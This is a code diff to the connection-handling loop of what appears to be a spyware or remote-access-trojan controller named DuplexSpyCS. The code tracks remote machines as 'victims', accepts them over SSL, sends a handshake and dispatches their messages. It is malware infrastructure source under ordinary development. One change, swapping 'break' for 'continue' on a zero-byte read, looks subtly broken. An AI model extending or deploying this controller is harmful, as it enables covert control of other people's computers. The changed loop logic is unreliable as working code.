@@ -111,16 +111,18 @@ namespace DuplexSpyCS
             clsVictim victim = (clsVictim)ar.AsyncState;
             m_lsVictim.Add(victim);
 
+            clsStore.sql_conn.WriteSystemLogs($"New client is accepted: {victim.socket.RemoteEndPoint.ToString()}");
+
             try
             {
                 SslStream sslClnt = victim.m_sslClnt;
                 clsDSP dsp = null;
 
-                clsStore.sql_conn.WriteSystemLogs($"New client is accepted: {victim.socket.RemoteEndPoint.ToString()}");
-
                 int nRecv = 0;
                 byte[] abStaticRecvBuffer = new byte[clsVictim.MAX_BUFFER_LENGTH];
                 byte[] abDynamicRecvBuffer = { };
+
+                victim.fnSslSend(1, 0, clsEZData.fnGenerateRandomStr());
 
                 clsStore.sql_conn.WriteSystemLogs($"Sent handshake: {victim.socket.RemoteEndPoint.ToString()}");
 
@@ -133,7 +135,7 @@ namespace DuplexSpyCS
                     clsStore.recv_bytes += nRecv;
 
                     if (nRecv <= 0)
-                        break;
+                        continue;
                     else if (abDynamicRecvBuffer.Length < clsDSP.HEADER_SIZE)
                         continue;
                     else
@@ -157,14 +159,17 @@ namespace DuplexSpyCS
                                     string szPlain = Encoding.UTF8.GetString(abBuffer);
                                     List<string> lsMsg = szPlain.Split('|').ToList();
 
-                                    try
+                                    Task.Run(() =>
                                     {
-                                        fnReceivedDecoded(this, victim, lsMsg);
-                                    }
-                                    catch (InvalidOperationException)
-                                    {
+                                        try
+                                        {
+                                            fnReceivedDecoded(this, victim, lsMsg);
+                                        }
+                                        catch (InvalidOperationException)
+                                        {
 
-                                    }
+                                        }
+                                    });
                                 }
                             }
                         }
@@ -175,10 +180,10 @@ namespace DuplexSpyCS
             catch (Exception ex)
             {
                 clsStore.sql_conn.WriteErrorLogs(victim, ex.Message);
-                fnDisconnected(victim);
             }
             finally
             {
+                fnDisconnected(victim);
                 m_lsVictim.Remove(victim);
             }
         }
